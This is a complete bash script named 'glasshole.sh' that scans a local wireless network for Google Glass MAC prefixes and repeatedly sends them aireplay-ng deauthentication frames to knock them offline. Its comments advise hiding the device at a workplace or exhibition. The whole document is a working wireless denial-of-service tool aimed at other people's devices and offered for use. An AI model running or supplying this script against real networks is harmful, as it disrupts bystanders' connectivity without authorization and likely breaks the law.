#!/bin/bash
#
# GLASSHOLE.SH
#
# Find and kick Google Glass devices from your local wireless network.  Requires
# 'beep', 'arp-scan', 'aircrack-ng' and a GNU/Linux host.  Put on a BeagleBone
# black or Raspberry Pi. Plug in a good USB wireless NIC (like the TL-WN722N)
# and wear it, hide it in your workplace or your exhibition.
#
# Save as glasshole.sh, 'chmod +x glasshole.sh' and exec as follows:
#
#   sudo ./glasshole.sh <WIRELESS NIC> <BSSID OF ACCESS POINT>

shopt -s nocasematch # Set shell to ignore case

NIC=$1 # Your wireless NIC
BSSID=$2 # Network BSSID (exhibition, workplace, park)
MAC=$(/sbin/ifconfig | grep $NIC | head -n 1 | awk '{ print $5 }')
GGMAC='F8:8F:CA:24' # May change as new editions of Google Glass are released 
POLL=30 # Check every 30 seconds

airmon-ng stop mon0 # Pull down any lingering monitor devices
airmon-ng start $NIC # Start a monitor device

echo '
   ___           _ __    __                     __             __        __   
  / _ \___  ___ ( ) /_  / /  ___   ___ _  ___ _/ /__ ____ ___ / /  ___  / /__ 
 / // / _ \/ _ \|/ __/ / _ \/ -_) / _ `/ / _ `/ / _ `(_-<(_-</ _ \/ _ \/ / -_)
/____/\___/_//_/ \__/ /_.__/\__/  \_,_/  \_, /_/\_,_/___/___/_//_/\___/_/\__/ 
                                        /___/                                 
'

while true;
    do  
        for TARGET in $(arp-scan -I $NIC --localnet | grep -o -E \
        '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
           do
               if [[ $TARGET == *$GGMAC* ]]
                   then
                       # Audio alert
                       beep -f 1000 -l 500 -n 200 -r 2
                       echo "Glasshole discovered: "$TARGET
                       echo "De-authing..."
                       aireplay-ng -0 1 -a $BSSID -c $TARGET mon0 
                    else
                        echo $TARGET": is not a Google Glass. Leaving alone.."
               fi
           done
           echo "None found this round."
           sleep $POLL
done
airmon-ng stop mon0
